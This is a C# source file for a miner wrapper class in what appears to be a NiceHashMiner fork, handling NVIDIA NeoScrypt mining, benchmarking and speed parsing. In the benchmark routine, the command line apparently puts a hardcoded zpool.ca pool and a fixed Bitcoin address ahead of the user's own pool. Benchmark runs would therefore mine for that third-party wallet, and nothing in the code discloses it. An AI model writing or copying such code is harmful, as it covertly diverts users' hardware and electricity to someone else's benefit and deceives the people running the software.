using NiceHashMiner.Miners.Grouping;
using NiceHashMiner.Miners.Parsing;
using System;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Threading.Tasks;
using NiceHashMiner.Algorithms;
using NiceHashMiner.Configs;
using System.Threading;
using NiceHashMinerLegacy.Common.Enums;
using System.Windows.Forms;

namespace NiceHashMiner.Miners
{
    public class hsrneoscrypt : Miner
    {
        public hsrneoscrypt() : base("hsrneoscrypt_NVIDIA")
        { }
        private int count = 0;
        double speed = 0;
        private int _benchmarkTimeWait = 240;
        bool benchmarkException => MiningSetup.MinerPath == MinerPaths.Data.hsrneoscrypt;


        protected override int GetMaxCooldownTimeInMilliseconds()
        {
            return 60 * 1000 * 10;
        }

        public override void Start(string url, string btcAdress, string worker)
        {
            if (!IsInit)
            {
                Helpers.ConsolePrint(MinerTag(), "MiningSetup is not initialized exiting Start()");
                return;
            }
            string username = GetUsername(btcAdress, worker);

            //IsAPIReadException = MiningSetup.MinerPath == MinerPaths.Data.hsrneoscrypt;
            IsApiReadException = false; //** in miner

            string alg = url.Substring(url.IndexOf("://") + 3, url.IndexOf(".") - url.IndexOf("://") - 3);
            string port = url.Substring(url.IndexOf(".com:") + 5, url.Length - url.IndexOf(".com:") - 5);
            /*
            LastCommandLine = algo +
                              " --url=" + url +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".hk.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".in.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".jp.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".usa.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".br.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              " --url stratum+tcp://" + alg + ".eu.nicehash.com:" + port +
                              " --userpass=" + username + ":x " +
                              apiBind + " " +
                                  ExtraLaunchParametersParser.ParseForMiningSetup(
                                                                MiningSetup,
                                                                DeviceType.NVIDIA) +
                                  " --devices ";

            LastCommandLine += GetDevicesCommandString();
*/

            LastCommandLine = " --url=" + url +
                                  " --user=" + username +
                          " -p x " +
                                  ExtraLaunchParametersParser.ParseForMiningSetup(
                                                                MiningSetup,
                                                                DeviceType.NVIDIA) +
                                  " --devices ";
            LastCommandLine += GetDevicesCommandString();
            ProcessHandle = _Start();
        }

        protected override void _Stop(MinerStopType willswitch)
        {
            Stop_cpu_ccminer_sgminer_nheqminer(willswitch);
        }

        #region Decoupled benchmarking routines

        protected override string BenchmarkCreateCommandLine(Algorithm algorithm, int time)
        {

            string url = Globals.GetLocationUrl(algorithm.NiceHashID, Globals.MiningLocation[ConfigManager.GeneralConfig.ServiceLocation], this.ConectionType);
            var btcAddress = Globals.GetBitcoinUser();
            var worker = ConfigManager.GeneralConfig.WorkerName.Trim();
            string username = GetUsername(btcAddress, worker);
            string CommandLine = " --url=stratum+tcp://neoscrypt.eu.mine.zpool.ca:4233" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2" + ":c=BTC " +
                " --url=" + url +
                                  " --user=" + username +
                          " -p x " +
                                  ExtraLaunchParametersParser.ParseForMiningSetup(
                                                                MiningSetup,
                                                                DeviceType.NVIDIA) +
                                  " --devices ";
            CommandLine += GetDevicesCommandString();

            Helpers.ConsolePrint(MinerTag(), CommandLine);
            _benchmarkTimeWait = time;
            return CommandLine;
        }

        protected override bool BenchmarkParseLine(string outdata)
        {
            Helpers.ConsolePrint(MinerTag(), outdata);
            if (benchmarkException)
            {

                if (outdata.Contains("speed is "))
                {
                    count++;
                    int st = outdata.IndexOf("speed is ");
                    int end = outdata.IndexOf("kH/s");
                    string hashspeed = outdata.Substring(st + 9, end - st - 9);
                    try
                    {
                        speed = speed + Double.Parse(hashspeed, CultureInfo.InvariantCulture);
                    }
                    catch
                    {
                        MessageBox.Show("Unsupported miner version - " + MiningSetup.MinerPath,
                            "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        BenchmarkSignalFinnished = true;
                        return false;
                    }
                    if (count >= _benchmarkTimeWait / 60)
                    {
                        BenchmarkAlgorithm.BenchmarkSpeed = (speed/count) * 1000;
                        BenchmarkSignalFinnished = true;
                    }
                }
            }
            return false;
        }

        protected override void BenchmarkOutputErrorDataReceivedImpl(string outdata)
        {
            CheckOutdata(outdata);
        }

        protected override void BenchmarkThreadRoutine(object CommandLine)
        {
            BenchmarkSignalQuit = false;
            BenchmarkSignalHanged = false;
            BenchmarkSignalFinnished = false;
            BenchmarkException = null;

            Thread.Sleep(ConfigManager.GeneralConfig.MinerRestartDelayMS);

            try
            {
                Helpers.ConsolePrint("BENCHMARK", "Benchmark starts");
                BenchmarkHandle = BenchmarkStartProcess((string)CommandLine);

                BenchmarkThreadRoutineStartSettup();
                BenchmarkTimeInSeconds = 600;
                BenchmarkProcessStatus = BenchmarkProcessStatus.Running;
                var exited = BenchmarkHandle.WaitForExit((BenchmarkTimeoutInSeconds(BenchmarkTimeInSeconds) + 20) * 1000);
                if (BenchmarkSignalTimedout && !TimeoutStandard)
                {
                    throw new Exception("Benchmark timedout");
                }

                if (BenchmarkException != null)
                {
                    throw BenchmarkException;
                }

                if (BenchmarkSignalQuit)
                {
                    throw new Exception("Termined by user request");
                }

                if (BenchmarkSignalHanged || !exited)
                {
                    throw new Exception("Miner is not responding");
                }

                if (BenchmarkSignalFinnished)
                {
                    //break;
                }
            }
            catch (Exception ex)
            {
                BenchmarkThreadRoutineCatch(ex);
            }
            finally
            {
                BenchmarkThreadRoutineFinish();
            }
        }



        #endregion // Decoupled benchmarking routines

        public override async Task<ApiData> GetSummaryAsync()
        {
            ApiData hsrData = new ApiData(MiningSetup.CurrentAlgorithmType);
            hsrData.Speed = 0;
            if (IsApiReadException)
            {
                if (ProcessHandle == null)
                {
                    CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                    Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from hsrminer Proccess is null");
                    return null;
                }
                try
                {
                    var runningProcess = Process.GetProcessById(ProcessHandle.Id);
                }
                catch (ArgumentException ex)
                {
                    CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                    Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from hsrminer reason: " + ex.Message);
                    return null;
                }
                catch (InvalidOperationException ex)
                {
                    CurrentMinerReadStatus = MinerApiReadStatus.RESTART;
                    Helpers.ConsolePrint(MinerTag(), ProcessTag() + " Could not read data from hsrminer reason: " + ex.Message);
                    return null;
                }

                var totalSpeed = 0.0d;
                foreach (var miningPair in MiningSetup.MiningPairs)
                {
                    var algo = miningPair.Device.GetAlgorithm(MinerBaseType.hsrneoscrypt, AlgorithmType.NeoScrypt, AlgorithmType.NONE);
                    if (algo != null)
                    {
                        totalSpeed += algo.BenchmarkSpeed;
                        CurrentMinerReadStatus = MinerApiReadStatus.GOT_READ;
                    }
                }

            }

            return await GetSummaryCPU_hsrneoscryptAsync();

        }
    }

}


